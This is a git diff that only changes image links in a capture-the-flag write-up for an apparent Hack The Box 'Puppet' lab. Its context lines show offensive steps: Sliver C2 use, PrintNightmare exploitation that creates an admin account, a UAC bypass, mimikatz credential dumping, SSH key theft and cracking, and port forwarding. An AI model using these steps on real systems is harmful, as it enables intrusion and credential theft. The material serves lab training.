@@ -1,6 +1,6 @@
 # Puppet
 
-![Alt Text](D:\Hack-the-box-main\P\Puppet.png)
+![Puppet](../P/Puppet.png)
 
 ## Flag 1
 
@@ -10,7 +10,7 @@ First, scan the target using `nmap`:
 nmap 10.13.38.33 -sC -sV -Pn
 ```
 
-![Puppet Image](./puppet1.png)
+![Puppet](../P/puppet1.png)
 
 ```cmd
 Starting Nmap 7.95 ( https://nmap.org ) at 2026-10-27 21:01 +0630
@@ -63,7 +63,7 @@ The FTP service allows anonymous login and exposes two interesting files: a Sliv
 ftp 10.13.38.33
 ```
 
-![Alt Text](D:\Hack-the-box-main\P\puppet2.png)
+![Puppet](../P/puppet2.png)
 
 ```cmd
 ┌──(kali㉿kali)-[~/Downloads]
@@ -123,7 +123,7 @@ sudo socat TCP-LISTEN:31337,reuseaddr,fork TCP:10.13.38.33:31337
 2026/10/27 22:39:05 Saved new client config to: /home/kali/.sliver-client/configs/red_127.0.0.1.cfg
 ```
 
-![Alt Text](D:\Hack-the-box-main\P\puppet3.png)
+![Puppet](../P/puppet3.png)
 
 - `sliver-client_linux` is the client application itself.
 - `red_127.0.0.1.cfg` is the configuration ("key") the application needs to connect to the C2 server.
@@ -136,7 +136,7 @@ sudo socat TCP-LISTEN:31337,reuseaddr,fork TCP:10.13.38.33:31337
 
 To connect to the Sliver server:
 
-![Alt Text](D:\Hack-the-box-main\P\puppet4.png)
+![Puppet](../P/puppet4.png)
 
 ```cmd
 sliver > beacons
@@ -144,13 +144,13 @@ sliver > beacons
 
 `beacons` lists all currently checked-in Sliver beacons (asynchronous implants that call back on a schedule rather than staying connected interactively).
 
-![Alt Text](D:\Hack-the-box-main\P\puppet5.png)
+![Puppet](../P/puppet5.png)
 
 ```cmd
 sliver (BLUSHING_ERROR) > interactive
 ```
 
-![Alt Text](D:\Hack-the-box-main\P\puppet6.png)
+![Puppet](../P/puppet6.png)
 
 The `interactive` command upgrades a beacon from **beacon mode** (periodic check-ins) to an **interactive session** (a real-time, continuous connection), by instructing the C2 server to send the appropriate command to the target.
 
@@ -160,7 +160,7 @@ Then select the session:
 use session_id
 ```
 
-![Alt Text](D:\Hack-the-box-main\P\puppet7.png)
+![Puppet](../P/puppet7.png)
 
 **Puppet** is a configuration management tool: in DevOps and system administration, Puppet automatically installs software, runs scripts, and enforces security settings across large numbers of servers — an infrastructure automation tool.
 
@@ -180,7 +180,7 @@ armory install sa-whoami
 
 Use it:
 
-![Alt Text](D:\Hack-the-box-main\P\puppet8.png)
+![Puppet](../P/puppet8.png)
 
 Navigate to the working directory:
 
@@ -200,7 +200,7 @@ And run it:
 sharp-hound-4 -s -t 300 -- -c all,gplocalgroup
 ```
 
-![Alt Text](D:\Hack-the-box-main\P\puppet9.png)
+![Puppet](../P/puppet9.png)
 
 Then go to the file path `c://tmp` and download the collected data:
 
@@ -208,7 +208,7 @@ Then go to the file path `c://tmp` and download the collected data:
 download 20261027120553_BloodHound.zip
 ```
 
-![Alt Text](D:\Hack-the-box-main\P\puppet10.png)
+![Puppet](../P/puppet10.png)
 
 Then install `sa-adcs-enum`:
 
@@ -234,7 +234,7 @@ Use it:
 sa-adcs-enum
 ```
 
-![Alt Text](D:\Hack-the-box-main\P\puppet11.png)
+![Puppet](../P/puppet11.png)
 
 `sa-netstat` enumerates active network connections and listening ports on the target, along with the process IDs (PIDs) / executables using them.
 
@@ -279,7 +279,7 @@ Upload it to `C:\temp\PrivescCheck.ps1`:
 upload /home/kali/Downloads/PrivescCheck.ps1 C:\temp\PrivescCheck.ps1
 ```
 
-![Alt Text](D:\Hack-the-box-main\P\puppet12.png)
+![Puppet](../P/puppet12.png)
 
 Check for vulnerabilities:
 
@@ -287,7 +287,7 @@ Check for vulnerabilities:
 sharpsh -t 300 -- -c invoke-privesccheck -u c:\\temp\\PrivescCheck.ps1
 ```
 
-![Alt Text](D:\Hack-the-box-main\P\puppet13.png)
+![Puppet](../P/puppet13.png)
 
 **PrintNightmare** (CVE-2021-34527 / CVE-2021-1675) is a vulnerability in the Windows Print Spooler service (`spoolsv.exe`) that allows unintended privilege escalation / remote code execution.
 
@@ -303,7 +303,7 @@ Upload the file:
 upload /home/kali/Downloads/CVE-2021-34527/CVE-2021-34527.ps1 C:/Windows/temp/CVE-2021-34527.ps1
 ```
 
-![Alt Text](D:\Hack-the-box-main\P\puppet14.png)
+![Puppet](../P/puppet14.png)
 
 ```cmd
 execute -o -- powershell.exe -ExecutionPolicy Bypass -NoProfile -Command ". C:/Windows/temp/CVE-2021-34527.ps1; Invoke-Nightmare -NewUser adm1n -NewPassword P@ssw0rd"
@@ -311,7 +311,7 @@ execute -o -- powershell.exe -ExecutionPolicy Bypass -NoProfile -Command ". C:/W
 
 This command exploits the Print Spooler vulnerability CVE-2021-34527 (PrintNightmare) to create a new local Administrator account on the Windows system.
 
-![Alt Text](D:\Hack-the-box-main\P\puppet15.png)
+![Puppet](../P/puppet15.png)
 
 ```cmd
 runas -u adm1n -P "P@ssw0rd" -p "C:\ProgramData\Puppet\puppet-update.exe"
@@ -328,7 +328,7 @@ This command uses the newly created Administrator account (`adm1n`) inside Slive
 
 **In short:** this uses the freshly created Administrator account (`adm1n`) to run a C2 payload with Administrator-level privileges — the **privilege execution / lateral movement** stage of the red-team engagement.
 
-![Alt Text](D:\Hack-the-box-main\P\puppet16.png)
+![Puppet](../P/puppet16.png)
 
 Check what permissions this account has:
 
@@ -336,7 +336,7 @@ Check what permissions this account has:
 sa-whoami
 ```
 
-![Alt Text](D:\Hack-the-box-main\P\puppet17.png)
+![Puppet](../P/puppet17.png)
 
 **UAC-BOF-Bonanza** is an open-source repository of BOFs (Beacon Object Files) used in red teaming/penetration testing to bypass Windows **UAC (User Account Control)**.
 
@@ -372,7 +372,7 @@ Upload the resulting file to the Sliver server:
 upload /home/kali/Downloads/UAC-BOF-Bonanza/SspiUacBypass/bin/standalone/SspiUacBypass.exe C:/Windows/temp/bypass.exe
 ```
 
-![Alt Text](D:\Hack-the-box-main\P\puppet18.png)
+![Puppet](../P/puppet18.png)
 
 Run it in the Sliver session:
 
@@ -388,11 +388,11 @@ Once in the session, copy and run the following command:
 sideload /usr/share/windows-resources/mimikatz/x64/mimikatz.exe "privilege::debug" "sek
 ```
 
-![Alt Text](D:\Hack-the-box-main\P\puppet19.png)
+![Puppet](../P/puppet19.png)
 
 Find the flag:
 
-![Alt Text](D:\Hack-the-box-main\P\puppet20.png)
+![Puppet](../P/puppet20.png)
 
 ## Flag 3
 
@@ -406,7 +406,7 @@ ps
 
 Found `ruby.exe`:
 
-![Alt Text](D:\Hack-the-box-main\P\puppet21.png)
+![Puppet](../P/puppet21.png)
 
 Use `migrate`:
 
@@ -416,7 +416,7 @@ migrate -p 556
 
 `migrate -p <PID>` tells a C2 framework (Metasploit/Meterpreter or Sliver) to move the current session/payload into the process with the given PID.
 
-![Alt Text](D:\Hack-the-box-main\P\puppet22.png)
+![Puppet](../P/puppet22.png)
 
 Then switch to another session:
 
@@ -424,7 +424,7 @@ Then switch to another session:
 sessions
 ```
 
-![Alt Text](D:\Hack-the-box-main\P\puppet23.png)
+![Puppet](../P/puppet23.png)
 
 And then migrate.
 
@@ -438,7 +438,7 @@ sliver (BLUSHING_ERROR) > execute -o -- arp -a
 
 This command is used to check the IP-to-MAC address mappings of devices previously seen on the local network — useful in the Puppet lab for understanding what other machines exist on the network.
 
-![Alt Text](D:\Hack-the-box-main\P\puppet24.png)
+![Puppet](../P/puppet24.png)
 
 ```cmd
 sa-netshares dc01
@@ -452,7 +452,7 @@ ls \\dc01.puppet.vl\it
 
 Lists the files and folders inside the `IT` network share on `DC01`.
 
-![Alt Text](D:\Hack-the-box-main\P\puppet25.png)
+![Puppet](../P/puppet25.png)
 
 ```cmd
 ls \\dc01.puppet.vl\it\.ssh
@@ -468,7 +468,7 @@ This lists the contents of the `.ssh` folder inside `DC01`'s `IT` network share.
 
 **Purpose in the Puppet lab:** check whether SSH key files exist, to plan the next step.
 
-![Alt Text](D:\Hack-the-box-main\P\puppet26.png)
+![Puppet](../P/puppet26.png)
 
 Download the file:
 
@@ -476,7 +476,7 @@ Download the file:
 download \\dc01.puppet.vl\it\.ssh\ed25519
 ```
 
-![Alt Text](D:\Hack-the-box-main\P\puppet27.png)
+![Puppet](../P/puppet27.png)
 
 ```cmd
 mv '\\dc01.puppet.vl\it\.ssh\ed25519' ed25519
@@ -490,7 +490,7 @@ ls -l ed25519
 john ed25519.hash --wordlist=/usr/share/wordlists/rockyou.txt
 ```
 
-![Alt Text](D:\Hack-the-box-main\P\puppet28.png)
+![Puppet](../P/puppet28.png)
 
 Set up port forwarding:
 
@@ -498,7 +498,7 @@ Set up port forwarding:
 portfwd add --bind 2222 -r 172.16.40.200:22
 ```
 
-![Alt Text](D:\Hack-the-box-main\P\puppet29.png)
+![Puppet](../P/puppet29.png)
 
 Use this command:
 
@@ -506,7 +506,7 @@ Use this command:
 ssh -i ~/Downloads/ed25519_lf -o IdentitiesOnly=yes 'svc_puppet_lin_t1@puppet.vl'@10.13.38.33
 ```
 
-![Alt Text](D:\Hack-the-box-main\P\puppet30.png)
+![Puppet](../P/puppet30.png)
 
 Use:
 
@@ -516,7 +516,6 @@ sudo -l
 
 `sudo -l` checks which commands the current Linux user is allowed to run with administrator/root privileges via `sudo`.
 
-![Alt Text](D:\Hack-the-box-main\P\puppet31.png)
 
 ## Flag 4
 
@@ -589,7 +588,7 @@ Run it:
 execute -o -- "c:\users\public\SharpDPAPI.exe" machinetriage
 ```
 
-![Alt Text](D:\Hack-the-box-main\P\puppet31.png)
+![Puppet](../P/puppet31.png)
 
 ## Achievement
 
